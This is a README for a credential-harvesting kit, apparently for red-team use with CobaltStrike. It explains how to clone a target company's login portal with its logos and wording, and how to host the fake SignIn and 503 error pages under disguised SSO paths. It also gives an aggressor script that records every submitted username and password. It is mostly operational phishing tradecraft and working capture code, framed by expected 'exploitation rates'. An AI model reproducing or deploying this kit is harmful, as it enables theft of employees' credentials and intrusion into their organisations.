# CredHarvest
## Description
Setup a credential harvesting campaign in about ~5 minutes. Using this technique usually garners ~5%-15% exploitation rates. This package includes 2 elements: a set of (almost) ready to go credential harvesting html documents and a credential importer aggressor script for CobaltStrike.
## Credential Harvesting Via POST Requests
To set up the HTML documents, just a few images and text are needed. A good first step is to go office.com > login. For username enter ‘a@<victim domain>’. Often that will take you to a company portal where you can pull images and text to add legitimacy.

As a tradecraft note, CobaltStrike does not properly host CSS files. Rather than pulling these externally or hosting elsewhere on the Team Server, they have been embedded for simplicity. It is unusual but will not set off any alerts. 

SignIn.html is smart enough to give an error if users do not give a domain username (at least x@) or if they do not give a password. SignIn.html can be renamed to anything, only 503_Error.html is hardcoded.

<b>SignIn.hmtl</b>
Line 134: \<style>.illustrationClass {background-image:url('https://LINKTOCOMPANYBACKGROUND');}
#Usually find a background image on the login portal, main website, or OSINT. This image scales with the window size, so try resizing the browser window a few times to make sure it’s somewhat universal.

Line 543: \<img class="logoImage" src="https://LINKTOLOGOIMAGE" alt="COMPANY NAME">
#Usually find a logo image on their main website. Also change company name to the organization.

Lines 553 and 578: …();" action="503_Error.html"> and \<form id="options" method="get" action="503_Error.html">
	
#The second page is hard coded to be '503_Error.html.' If you want to change that, update in these two locations. <b>Be aware that you will need to host the second HTML as this name and change a parameter in the aggressor script.</b>

Line 593: Only authorized users of COMPANYNAME may log on. The following…
#Some fluff to add legitimacy. If you find a login portal, it may be a good idea to change to their verbiage.

<b>503_Error.html</b>
Line 18: \<style>.illustrationClass {background-image:url('https://LINKTOCOMPANYBACKGROUND');} 
#Match to the background image from SignIn.html line 134

Line 427: \<img class="logoImage" src="https://LINKTOCOMPANYLOGO" alt="COMPANYNAME">
#Match to the logo image from SignIn.html line 543

Line 440: This resource is currently unavailable. Please try again later or contact your administrator…
#Generic error message. Convincing enough that users often try to log in multiple times throughout the day. Feel free to change.

The two documents should be hosted together in CobaltStrike using Attacks > Web Drive-by > Host File. A good tactic is to present them as some sort of single sign on, so for URI something like /content/partners/<victim org name>/sso/SignIn.html and /content/partners/<victim org name>/sso/503_Error.html respectively. Make the local host your domain, port 443, and enable SSL.
	
In spear phishing, attach the link to SignIn.html as %URL%. Users entering their credentials will post to the 503_Error.html page (captured by Team Server) and receive the benign 503_Error.html page.
	
<b>Automatically Log Credentials</b>
By default, CobaltStrike is not great for logging web data. CS web logs only retain the request, not the data. Particularly in the first 30 minutes of campaigns against large target lists, the web log console is going to be flying. Trying to copy and paste will be very challenging. Luckily automating parsed credentials for storage is possible.
	
Create a file named CredHarvest.cna and input the following text:
```cna
on web_hit {
	if (($1 eq "POST") && ("503_Error.html" isin $2)) {
	credential_add("$8['UserName']", "$8['Password']", "", "phishing", "$3");
	}
}
```
This script makes it so every time you get a POST request, and the URI includes 503_Error.html, CobaltStrike will parse the POST data and create a new credential entry. If for whatever reason you changed the file name of 503_Error.html, just update to match in this aggressor script.
	
Open the script console in CobaltStrike (View > Script Console)
	
Import the aggressor script using: `load <path to CredHarvest.cna>`

It should confirm the script was loaded, you can check using the ‘ls’ command. Should see (at least) default.cna and CredHarvest.cna.

CobaltStrike is smart enough to not make duplicates of the same record if the username/pw/host are identical, it will only update the time added.

<b>Setup</b>
Page out of the box
![b1b83507e43f6e0e5e17cb289276969c.png](../../_resources/b1b83507e43f6e0e5e17cb289276969c.png)
Page with images and text
![5bcce1f3a8a9bf113ddae5eed5e84c9a.png](../../_resources/5bcce1f3a8a9bf113ddae5eed5e84c9a.png)

503_Error.html with updated references
![d1e1642ec25a83806f39a288054828e1.png](../../_resources/d1e1642ec25a83806f39a288054828e1.png)

Hosted Files
![f69d57fb467a4bee65ba7e08527e7807.png](../../_resources/f69d57fb467a4bee65ba7e08527e7807.png)

Loaded Aggressor Script
![f238bba7f90fb8fdeacf7bea3204ad54.png](../../_resources/f238bba7f90fb8fdeacf7bea3204ad54.png)

<b>Proof of Concept</b>
User being phished
![0093cd38258149d16a6a7f69f91d71b0.png](../../_resources/0093cd38258149d16a6a7f69f91d71b0.png)
	
Result
![457f6ab5e59d73a0e8aa8d4f9d197e1c.png](../../_resources/457f6ab5e59d73a0e8aa8d4f9d197e1c.png)

Observed in Team Server
![8c0d32814ba11cdbd5723aaf4c3507ad.png](../../_resources/8c0d32814ba11cdbd5723aaf4c3507ad.png)

Auto-creds
![bb77479629fe2bfad3c12ead4c476284.png](../../_resources/bb77479629fe2bfad3c12ead4c476284.png)